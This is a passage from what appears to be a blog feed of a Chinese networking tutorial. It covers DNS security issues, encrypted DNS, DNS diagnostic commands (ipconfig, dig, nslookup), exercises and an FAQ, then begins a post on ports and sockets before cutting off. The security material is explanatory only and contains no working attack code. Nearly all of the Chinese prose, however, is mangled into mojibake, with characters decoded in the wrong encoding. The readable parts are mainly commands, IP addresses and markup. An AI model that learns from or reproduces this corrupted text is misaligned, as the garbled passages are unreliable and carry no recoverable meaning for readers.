class="hljs-number">208.67.220.220</span><br></code></pre></td></tr></table></figure><h3 id="6-2-DNSå®‰å…¨é—®é¢˜">6.2 DNSå®‰å…¨é—®é¢˜</h3><p><strong>1. DNSåŠ«æŒ</strong>ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">æ­£å¸¸æµç¨‹ï¼š<br>ç”¨æˆ· â†’ www<span class="hljs-selector-class">.bank</span><span class="hljs-selector-class">.com</span> â†’ çœŸå®é“¶è¡ŒIP<br><br>è¢«åŠ«æŒï¼š<br>ç”¨æˆ· â†’ www<span class="hljs-selector-class">.bank</span><span class="hljs-selector-class">.com</span> â†’ å‡å†’é’“é±¼ç½‘ç«™IP<br><br>é˜²æŠ¤æªæ–½ï¼š<br>- ä½¿ç”¨å¯ä¿¡DNSæœåŠ¡å™¨<br>- å¯ç”¨DNSSEC<br>- ä½¿ç”¨HTTPS<br></code></pre></td></tr></table></figure><p><strong>2. DNSæ±¡æŸ“</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ä»€ä¹ˆæ˜¯DNSæ±¡æŸ“ï¼Ÿ<br><span class="hljs-bullet">- </span>DNSæœåŠ¡å™¨è¿”å›é”™è¯¯çš„IPåœ°å€<br><span class="hljs-bullet">- </span>é€šå¸¸æ˜¯æŸäº›åœ°åŒºçš„ç½‘ç»œå®¡æŸ¥æ‰‹æ®µ<br><br>ç°è±¡ï¼š<br><span class="hljs-bullet">- </span>æŸäº›ç½‘ç«™æ— æ³•è®¿é—®<br><span class="hljs-bullet">- </span>è®¿é—®è¢«é‡å®šå‘åˆ°å…¶ä»–é¡µé¢<br><br>è§£å†³æ–¹æ³•ï¼š<br><span class="hljs-bullet">- </span>æ›´æ¢DNSæœåŠ¡å™¨<br><span class="hljs-bullet">- </span>ä½¿ç”¨VPN<br><span class="hljs-bullet">- </span>ä½¿ç”¨åŠ å¯†DNSï¼ˆDoH/DoTï¼‰<br></code></pre></td></tr></table></figure><p><strong>3. DNSæ”¾å¤§æ”»å‡»</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown">æ”»å‡»åŸç†ï¼š<br><span class="hljs-bullet">1.</span> æ”»å‡»è€…ä¼ªé€ å—å®³è€…IP<br><span class="hljs-bullet">2.</span> å‘DNSæœåŠ¡å™¨å‘é€æŸ¥è¯¢è¯·æ±‚<br><span class="hljs-bullet">3.</span> DNSæœåŠ¡å™¨å°†å¤§é‡å“åº”å‘é€ç»™å—å®³è€…<br><span class="hljs-bullet">4.</span> é€ æˆå—å®³è€…ç½‘ç»œç˜«ç—ª<br><br>ç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">-</span> å°è¯·æ±‚ â†’ å¤§å“åº”ï¼ˆæ”¾å¤§æ•ˆåº”ï¼‰<br><span class="hljs-bullet">-</span> å…¸å‹æ”¾å¤§å€æ•°ï¼š28-54å€<br></code></pre></td></tr></table></figure><h3 id="6-3-æ–°ä¸€ä»£DNSæŠ€æœ¯">6.3 æ–°ä¸€ä»£DNSæŠ€æœ¯</h3><p><strong>DoHï¼ˆDNS over HTTPSï¼‰</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ä¼ ç»ŸDNSï¼š<br>æ˜æ–‡ä¼ è¾“ï¼Œç«¯å£53ï¼Œæ˜“è¢«ç›‘å¬å’ŒåŠ«æŒ<br><br>DoHï¼š<br>é€šè¿‡HTTPSåŠ å¯†ä¼ è¾“ï¼Œç«¯å£443<br><span class="hljs-bullet">- </span>éšç§ä¿æŠ¤<br><span class="hljs-bullet">- </span>é˜²æ­¢åŠ«æŒ<br><span class="hljs-bullet">- </span>ç»•è¿‡æŸäº›é™åˆ¶<br><br>æ”¯æŒDoHçš„æµè§ˆå™¨ï¼š<br><span class="hljs-bullet">- </span>Firefox<br><span class="hljs-bullet">- </span>Chrome<br><span class="hljs-bullet">- </span>Edge<br></code></pre></td></tr></table></figure><p><strong>DoTï¼ˆDNS over TLSï¼‰</strong>ï¼š</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gauss">ç±»ä¼¼DoHï¼Œä½†ä½¿ç”¨TLSåè®®<br>ç«¯å£ï¼š<span class="hljs-number">853</span><br><br>åŒºåˆ«ï¼š<br>DoHï¼šä½¿ç”¨HTTPSï¼Œèå…¥æ­£å¸¸ç½‘é¡µæµé‡<br><span class="hljs-built_in">DoT</span>ï¼šä¸“ç”¨ç«¯å£ï¼Œæ˜“è¢«è¯†åˆ«å’Œè¿‡æ»¤<br></code></pre></td></tr></table></figure><p><strong>DNSSECï¼ˆDNS Security Extensionsï¼‰</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åŠŸèƒ½ï¼š<br><span class="hljs-bullet">-</span> é˜²æ­¢DNSæ¬ºéª—<br><span class="hljs-bullet">-</span> éªŒè¯DNSå“åº”çš„çœŸå®æ€§<br><span class="hljs-bullet">-</span> ä½¿ç”¨æ•°å­—ç­¾å<br><br>å·¥ä½œåŸç†ï¼š<br><span class="hljs-bullet">1.</span> æƒå¨DNSç”¨ç§é’¥ç­¾åè®°å½•<br><span class="hljs-bullet">2.</span> æŸ¥è¯¢æ—¶éªŒè¯ç­¾å<br><span class="hljs-bullet">3.</span> ç¡®ä¿æ•°æ®æœªè¢«ç¯¡æ”¹<br></code></pre></td></tr></table></figure><hr><h2 id="7-å®ç”¨å‘½ä»¤">7. å®ç”¨å‘½ä»¤</h2><h3 id="7-1-Windows-DNSå‘½ä»¤">7.1 Windows DNSå‘½ä»¤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æŸ¥çœ‹DNSç¼“å­˜</span><br>ipconfig /displaydns<br><br><span class="hljs-comment"># æ¸…é™¤DNSç¼“å­˜</span><br>ipconfig /flushdns<br><br><span class="hljs-comment"># æŸ¥çœ‹DNSé…ç½®</span><br>ipconfig /all<br><br><span class="hljs-comment"># ä½¿ç”¨nslookupæŸ¥è¯¢</span><br>nslookup www.baidu.com<br>nslookup www.baidu.com 8.8.8.8<br></code></pre></td></tr></table></figure><h3 id="7-2-Linux-Mac-DNSå‘½ä»¤">7.2 Linux/Mac DNSå‘½ä»¤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ä½¿ç”¨digæŸ¥è¯¢ï¼ˆæ¨èï¼‰</span><br>dig www.baidu.com<br>dig www.baidu.com @8.8.8.8<br>dig www.baidu.com MX<br>dig www.baidu.com +trace  <span class="hljs-comment"># è¿½è¸ªå®Œæ•´æŸ¥è¯¢è¿‡ç¨‹</span><br><br><span class="hljs-comment"># ä½¿ç”¨hostå‘½ä»¤</span><br>host www.baidu.com<br>host -t MX baidu.com<br><br><span class="hljs-comment"># ä½¿ç”¨nslookup</span><br>nslookup www.baidu.com<br><br><span class="hljs-comment"># æ¸…é™¤DNSç¼“å­˜ï¼ˆMacï¼‰</span><br><span class="hljs-built_in">sudo</span> dscacheutil -flushcache<br><span class="hljs-built_in">sudo</span> killall -HUP mDNSResponder<br><br><span class="hljs-comment"># æŸ¥çœ‹DNSé…ç½®</span><br><span class="hljs-built_in">cat</span> /etc/resolv.conf<br></code></pre></td></tr></table></figure><hr><h2 id="8-ä»Šæ—¥ç»ƒä¹ ">8. ä»Šæ—¥ç»ƒä¹ </h2><h3 id="ç»ƒä¹ 1ï¼šDNSæŸ¥è¯¢åˆ†æ">ç»ƒä¹ 1ï¼šDNSæŸ¥è¯¢åˆ†æ</h3><p>ä½¿ç”¨æˆ‘ä»¬çš„å·¥å…·æŸ¥è¯¢ä»¥ä¸‹åŸŸåï¼Œåˆ†æç»“æœï¼š</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">1</span>. www.baidu.<span class="hljs-keyword">com</span>ï¼ˆAè®°å½•ï¼‰<br><span class="hljs-number">2</span>. baidu.<span class="hljs-keyword">com</span>ï¼ˆMXè®°å½•ï¼‰<br><span class="hljs-number">3</span>. www.taobao.<span class="hljs-keyword">com</span>ï¼ˆCNAMEè®°å½•ï¼‰<br><span class="hljs-number">4</span>. qq.<span class="hljs-keyword">com</span>ï¼ˆNSè®°å½•ï¼‰<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 2ï¼šDNSæ€§èƒ½å¯¹æ¯”">ç»ƒä¹ 2ï¼šDNSæ€§èƒ½å¯¹æ¯”</h3><p>å¯¹æ¯”ä¸åŒDNSæœåŠ¡å™¨çš„æŸ¥è¯¢é€Ÿåº¦ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">æµ‹è¯•åŸŸåï¼šwww.google.com<br>æµ‹è¯•DNSï¼š<br><span class="hljs-bullet">- </span>æœ¬åœ°DNS<br><span class="hljs-bullet">- </span>8.8.8.8ï¼ˆGoogleï¼‰<br><span class="hljs-bullet">- </span>223.5.5.5ï¼ˆé˜¿é‡Œï¼‰<br><span class="hljs-bullet">- </span>1.1.1.1ï¼ˆCloudflareï¼‰<br><br>è®°å½•æ¯ä¸ªDNSçš„å“åº”æ—¶é—´<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 3ï¼šDNSè¿½è¸ª">ç»ƒä¹ 3ï¼šDNSè¿½è¸ª</h3><p>æ‰‹åŠ¨è¿½è¸ªä¸€ä¸ªåŸŸåçš„å®Œæ•´è§£æè¿‡ç¨‹ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åŸŸåï¼šwww.example.com<br><br>æ­¥éª¤ï¼š<br><span class="hljs-bullet">1.</span> æŸ¥è¯¢æ ¹DNSæœåŠ¡å™¨<br><span class="hljs-bullet">2.</span> æŸ¥è¯¢.comé¡¶çº§åŸŸæœåŠ¡å™¨<br><span class="hljs-bullet">3.</span> æŸ¥è¯¢example.comæƒå¨æœåŠ¡å™¨<br><span class="hljs-bullet">4.</span> è®°å½•æ¯ä¸€æ­¥çš„ç»“æœ<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 4ï¼šDNSè®°å½•é…ç½®">ç»ƒä¹ 4ï¼šDNSè®°å½•é…ç½®</h3><p>å¦‚æœä½ æœ‰è‡ªå·±çš„åŸŸåï¼Œå°è¯•é…ç½®ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> Aè®°å½•ï¼šæŒ‡å‘ä½ çš„æœåŠ¡å™¨<br><span class="hljs-bullet">2.</span> CNAMEè®°å½•ï¼šåˆ›å»ºå­åŸŸååˆ«å<br><span class="hljs-bullet">3.</span> MXè®°å½•ï¼šé…ç½®é‚®ä»¶æœåŠ¡å™¨<br><span class="hljs-bullet">4.</span> TXTè®°å½•ï¼šæ·»åŠ ç½‘ç«™éªŒè¯ä¿¡æ¯<br></code></pre></td></tr></table></figure><hr><h2 id="9-å¸¸è§é—®é¢˜">9. å¸¸è§é—®é¢˜</h2><p><strong>Q1ï¼šä¸ºä»€ä¹ˆæœ‰æ—¶å€™æ”¹äº†DNSè®°å½•ï¼Œä½†è®¿é—®è¿˜æ˜¯æ—§çš„IPï¼Ÿ</strong></p><p>Aï¼šè¿™æ˜¯å› ä¸ºDNSç¼“å­˜ã€‚è§£å†³æ–¹æ³•ï¼š</p><ul><li>æ¸…é™¤æœ¬åœ°DNSç¼“å­˜</li><li>ç­‰å¾…TTLè¿‡æœŸ</li><li>è®¾ç½®è¾ƒçŸ­çš„TTLå€¼ï¼ˆä¿®æ”¹å‰ï¼‰</li></ul><p><strong>Q2ï¼šä»€ä¹ˆæ—¶å€™ç”¨Aè®°å½•ï¼Œä»€ä¹ˆæ—¶å€™ç”¨CNAMEï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>Aè®°å½•ï¼šç›´æ¥æŒ‡å‘IPï¼Œé€Ÿåº¦å¿«</li><li>CNAMEï¼šæŒ‡å‘å¦ä¸€ä¸ªåŸŸåï¼Œçµæ´»ä½†å¤šä¸€æ¬¡æŸ¥è¯¢</li><li>æ ¹åŸŸåï¼ˆ<a href="http://example.com">example.com</a>ï¼‰åªèƒ½ç”¨Aè®°å½•</li><li>å­åŸŸåï¼ˆ<a href="http://www.example.com">www.example.com</a>ï¼‰ä¸¤è€…éƒ½å¯ä»¥</li></ul><p><strong>Q3ï¼šå¦‚ä½•é€‰æ‹©DNSæœåŠ¡å™¨ï¼Ÿ</strong></p><p>Aï¼šè€ƒè™‘å› ç´ ï¼š</p><ul><li>é€Ÿåº¦ï¼šé€‰æ‹©ç¦»ä½ è¿‘çš„æœåŠ¡å™¨</li><li>ç¨³å®šæ€§ï¼šé€‰æ‹©å¤§å‚çš„å…¬å…±DNS</li><li>éšç§ï¼šé¿å…è®°å½•æŸ¥è¯¢æ—¥å¿—çš„DNS</li><li>åŠŸèƒ½ï¼šæ˜¯å¦æ”¯æŒDoHã€å¹¿å‘Šè¿‡æ»¤ç­‰</li></ul><p><strong>Q4ï¼šDNSæŸ¥è¯¢èµ°TCPè¿˜æ˜¯UDPï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>é€šå¸¸èµ°UDPï¼ˆç«¯å£53ï¼‰</li><li>å“åº”è¶…è¿‡512å­—èŠ‚æ—¶èµ°TCP</li><li>DNSSECã€åŒºåŸŸä¼ è¾“èµ°TCP</li><li>DoHèµ°TCPï¼ˆHTTPSï¼‰</li></ul><hr><h2 id="10-æ€»ç»“">10. æ€»ç»“</h2><p>ä»Šå¤©æˆ‘ä»¬å­¦ä¹ äº†ï¼š</p><h3 id="æ ¸å¿ƒçŸ¥è¯†ç‚¹">æ ¸å¿ƒçŸ¥è¯†ç‚¹</h3><ol><li><p><strong>DNSåŸºç¡€</strong>ï¼š</p><ul><li>DNSæ˜¯åŸŸåä¸IPåœ°å€çš„æ˜ å°„ç³»ç»Ÿ</li><li>åˆ†å¸ƒå¼ã€å±‚çº§åŒ–æ¶æ„</li></ul></li><li><p><strong>DNSæ¶æ„</strong>ï¼š</p><ul><li>æ ¹åŸŸã€é¡¶çº§åŸŸã€äºŒçº§åŸŸã€å­åŸŸ</li><li>æ ¹æœåŠ¡å™¨ã€TLDæœåŠ¡å™¨ã€æƒå¨æœåŠ¡å™¨ã€æœ¬åœ°æœåŠ¡å™¨</li></ul></li><li><p><strong>æŸ¥è¯¢è¿‡ç¨‹</strong>ï¼š</p><ul><li>é€’å½’æŸ¥è¯¢ vs è¿­ä»£æŸ¥è¯¢</li><li>å¤šçº§ç¼“å­˜æœºåˆ¶</li><li>TTLæœºåˆ¶</li></ul></li><li><p><strong>è®°å½•ç±»å‹</strong>ï¼š</p><ul><li>A/AAAAï¼šåœ°å€è®°å½•</li><li>CNAMEï¼šåˆ«åè®°å½•</li><li>MXï¼šé‚®ä»¶æœåŠ¡å™¨</li><li>NSï¼šåŸŸåæœåŠ¡å™¨</li><li>TXTï¼šæ–‡æœ¬ä¿¡æ¯</li></ul></li><li><p><strong>DNSå®‰å…¨</strong>ï¼š</p><ul><li>DNSåŠ«æŒã€DNSæ±¡æŸ“</li><li>DoHã€DoTã€DNSSEC</li></ul></li></ol><h3 id="é‡ç‚¹å›é¡¾">é‡ç‚¹å›é¡¾</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">DNS</span> = äº’è”ç½‘çš„<span class="hljs-string">&quot;é€šè®¯å½•&quot;</span><br>ä½œç”¨ = åŸŸå â†’ <span class="hljs-built_in">IP</span>åœ°å€<br><br>æ¶æ„ï¼šåˆ†å¸ƒå¼ + å±‚çº§åŒ–<br>æŸ¥è¯¢ï¼šç¼“å­˜ä¼˜å…ˆ + é€’å½’æŸ¥è¯¢<br>å®‰å…¨ï¼šåŠ å¯† + éªŒè¯<br></code></pre></td></tr></table></figure><h3 id="æ˜å¤©é¢„å‘Š">æ˜å¤©é¢„å‘Š</h3><p><strong>ç¬¬13å¤©ï¼šDHCPåè®®ä¸ç½‘ç»œé…ç½®</strong></p><p>å†…å®¹é¢„è§ˆï¼š</p><ul><li>DHCPå·¥ä½œåŸç†</li><li>IPåœ°å€è‡ªåŠ¨åˆ†é…</li><li>DHCPå››æ¬¡æ¡æ‰‹è¿‡ç¨‹</li><li>å®æˆ˜ï¼šDHCPæœåŠ¡å™¨æ­å»º</li></ul><hr><p><strong>ç»§ç»­åŠ æ²¹ï¼ğŸš€</strong></p><p>ä»Šå¤©æˆ‘ä»¬æ·±å…¥å­¦ä¹ äº†DNSåè®®ï¼Œç†è§£äº†äº’è”ç½‘åŸŸåè§£æçš„å®Œæ•´æµç¨‹ã€‚DNSæ˜¯äº’è”ç½‘çš„åŸºç¡€è®¾æ–½ï¼Œå‡ ä¹æ‰€æœ‰çš„ç½‘ç»œè®¿é—®éƒ½ç¦»ä¸å¼€å®ƒã€‚æŒæ¡DNSä¸ä»…èƒ½å¸®ä½ ç†è§£ç½‘ç»œå·¥ä½œåŸç†ï¼Œè¿˜èƒ½åœ¨é‡åˆ°ç½‘ç»œé—®é¢˜æ—¶å¿«é€Ÿå®šä½å’Œè§£å†³ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>11å¤©ï¼šç«¯å£å’ŒSocketæ·±å…¥</title>
    <link href="/2025/11/10/11%E5%A4%A9%EF%BC%9A%E7%AB%AF%E5%8F%A3%E5%92%8CSocket%E6%B7%B1%E5%85%A5/"/>
    <url>/2025/11/10/11%E5%A4%A9%EF%BC%9A%E7%AB%AF%E5%8F%A3%E5%92%8CSocket%E6%B7%B1%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1>ç¬¬11å¤©ï¼šç«¯å£å’ŒSocketæ·±å…¥</h1><blockquote><p>â€œç«¯å£æ˜¯åº”ç”¨ç¨‹åºçš„é—¨ç‰Œå·ï¼ŒSocketæ˜¯ç½‘ç»œç¼–ç¨‹çš„å¤§é—¨ã€‚â€</p></blockquote><h2 id="ğŸ“š-ä»Šæ—¥ç›®æ ‡">ğŸ“š ä»Šæ—¥ç›®æ ‡</h2><ul><li>ç†è§£ç«¯å£çš„æ¦‚å¿µå’Œä½œç”¨</li><li>æŒæ¡ç«¯å£çš„åˆ†ç±»å’Œå¸¸ç”¨ç«¯å£å·</li><li>æ·±å…¥ç†è§£Socketç¼–ç¨‹</li><li>åŒºåˆ†TCP Socketå’ŒUDP Socket</li><li>ç¼–å†™ç«¯å£æ‰«æå™¨å·¥å…·</li></ul><h2 id="ğŸ¯-ä»€ä¹ˆæ˜¯ç«¯å£ï¼Ÿ">ğŸ¯ ä»€ä¹ˆæ˜¯ç«¯å£ï¼Ÿ</h2><h3 id="ç”Ÿæ´»ä¸­çš„ä¾‹å­">ç”Ÿæ´»ä¸­çš„ä¾‹å­</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns">ç«¯å£ = å…¬å¸å¤§æ¥¼çš„æˆ¿é—´å·<br><br>å¤§æ¥¼åœ°å€ï¼ˆIPåœ°å€ï¼‰ï¼š<br>åŒ—äº¬å¸‚æœé˜³åŒºæŸæŸè·¯<span class="hljs-number">100</span>å·<br><br>æˆ¿é—´å·ï¼ˆç«¯å£ï¼‰ï¼š<br><span class="hljs-number">101</span>å®¤ - å‰å°<br><span class="hljs-number">201</span>å®¤ - è´¢åŠ¡éƒ¨<br><span class="hljs-number">301</span>å®¤ - æŠ€æœ¯éƒ¨<br><br>è®¿é—®æ–¹å¼ï¼š<br>æ‰¾æŠ€æœ¯éƒ¨ = åŒ—äº¬å¸‚æœé˜³åŒºæŸæŸè·¯<span class="hljs-number">100å·301</span>å®¤<br>è®¿é—®ç½‘ç«™ = <span class="hljs-number">220.181.38.148</span>:<span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p><strong>ç«¯å£</strong>ï¼ˆPortï¼‰æ˜¯ä¼ è¾“å±‚çš„æ¦‚å¿µï¼Œç”¨äºæ ‡è¯†ä¸»æœºä¸Šçš„ä¸åŒåº”ç”¨ç¨‹åºæˆ–æœåŠ¡ã€‚</p><h3 id="ç«¯å£çš„ä½œç”¨">ç«¯å£çš„ä½œç”¨</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">é—®é¢˜ï¼šä¸€å°ç”µè„‘åŒæ—¶è¿è¡Œå¤šä¸ªç½‘ç»œç¨‹åº<br><span class="hljs-bullet">- </span>æµè§ˆå™¨è®¿é—®ç½‘é¡µ<br><span class="hljs-bullet">- </span>QQèŠå¤©<br><span class="hljs-bullet">- </span>ä¸‹è½½æ–‡ä»¶<br><span class="hljs-bullet">- </span>æ’­æ”¾åœ¨çº¿è§†é¢‘<br><br>å¦‚ä½•åŒºåˆ†è¿™äº›æ•°æ®æ˜¯ç»™å“ªä¸ªç¨‹åºçš„ï¼Ÿ<br>ç­”æ¡ˆï¼šé€šè¿‡ç«¯å£å·ï¼<br><br>æ•°æ®åŒ…åˆ°è¾¾ï¼š<br>IPåœ°å€ â†’ æ‰¾åˆ°æ­£ç¡®çš„ç”µè„‘<br>ç«¯å£å· â†’ æ‰¾åˆ°æ­£ç¡®çš„ç¨‹åº<br></code></pre></td></tr></table></figure><h2 id="ğŸ“Š-ç«¯å£çš„åŸºæœ¬ç‰¹å¾">ğŸ“Š ç«¯å£çš„åŸºæœ¬ç‰¹å¾</h2><h3 id="1-ç«¯å£å·èŒƒå›´">1. ç«¯å£å·èŒƒå›´</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">ç«¯å£å·ï¼š<span class="hljs-number">16</span>ä½æ— ç¬¦å·æ•´æ•°<br>èŒƒå›´ï¼š<span class="hljs-number">0</span> - <span class="hljs-number">65535ï¼ˆ2^16</span> - <span class="hljs-number">1</span>ï¼‰<br><br>åˆ†ä¸ºä¸‰ç±»ï¼š<br></code></pre></td></tr></table></figure><h3 id="2-ç«¯å£åˆ†ç±»">2. ç«¯å£åˆ†ç±»</h3><table><thead><tr><th>ç±»åˆ«</th><th>èŒƒå›´</th><th>è¯´æ˜</th><th>ä¾‹å­</th></tr></thead><tbody><tr><td>çŸ¥åç«¯å£</td><td>0-1023</td><td>ç³»ç»Ÿä¿ç•™ï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™</td><td>80(HTTP), 443(HTTPS), 22(SSH)</td></tr><tr><td>æ³¨å†Œç«¯å£</td><td>1024-49151</td><td>è½¯ä»¶å‚å•†æ³¨å†Œä½¿ç”¨</td><td>3306(MySQL), 8080(HTTPä»£ç†)</td></tr><tr><td>åŠ¨æ€/ç§æœ‰ç«¯å£</td><td>49152-65535</td><td>å®¢æˆ·ç«¯ä¸´æ—¶ä½¿ç”¨</td><td>éšæœºåˆ†é…</td></tr></tbody></table><h3 id="3-ç«¯å£çš„çŠ¶æ€">3. ç«¯å£çš„çŠ¶æ€</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ç«¯å£çš„ä¸‰ç§çŠ¶æ€ï¼š<br><br><span class="hljs-bullet">1.</span> LISTENINGï¼ˆç›‘å¬ï¼‰<br>   æœåŠ¡å™¨ç¨‹åºæ­£åœ¨ç›‘å¬ï¼Œç­‰å¾…è¿æ¥<br>   ä¾‹å¦‚ï¼šWebæœåŠ¡å™¨ç›‘å¬80ç«¯å£<br><br><span class="hljs-bullet">2.</span> ESTABLISHEDï¼ˆå·²å»ºç«‹ï¼‰<br>   è¿æ¥å·²å»ºç«‹ï¼Œæ­£åœ¨é€šä¿¡<br>   ä¾‹å¦‚ï¼šæµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¹‹é—´çš„è¿æ¥<br><br><span class="hljs-bullet">3.</span> CLOSEDï¼ˆå…³é—­ï¼‰<br>   ç«¯å£æœªè¢«ä½¿ç”¨<br></code></pre></td></tr></table></figure><h2 id="ğŸ”¢-å¸¸ç”¨ç«¯å£å·">ğŸ”¢ å¸¸ç”¨ç«¯å£å·</h2><h3 id="WebæœåŠ¡">WebæœåŠ¡</h3><table><thead><tr><th>ç«¯å£</th><th>åè®®</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>80</td><td>HTTP</td><td>ç½‘é¡µæµè§ˆï¼ˆæ˜æ–‡ï¼‰</td></tr><tr><td>443</td><td>HTTPS</td><td>å®‰å…¨ç½‘é¡µæµè§ˆï¼ˆåŠ å¯†ï¼‰</td></tr><tr><td>8080</td><td>HTTP</td><td>HTTPä»£ç†ã€æµ‹è¯•æœåŠ¡å™¨</td></tr><tr><td>8443</td><td>HTTPS</td><td>HTTPSå¤‡ç”¨ç«¯å£</td></tr></tbody></table><h3 id="æ–‡ä»¶ä¼ è¾“">æ–‡ä»¶ä¼ è¾“</h3><table><thead><tr><th>ç«¯å£</th><th>åè®®</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>20</td><td>FTP-DATA</td><td>FTPæ•°æ®ä¼ è¾“</td></tr><tr><td>21</td><td>FTP</td><td>FTPæ§åˆ¶è¿æ¥</td></tr><tr><td>22</td><td>SFTP/SSH</td><td>å®‰å…¨æ–‡ä»¶ä¼ è¾“</td></tr><tr><td>69</td><td>TFTP</td><td>ç®€å•æ–‡ä»¶ä¼ è¾“</td></tr></tbody></table><h3 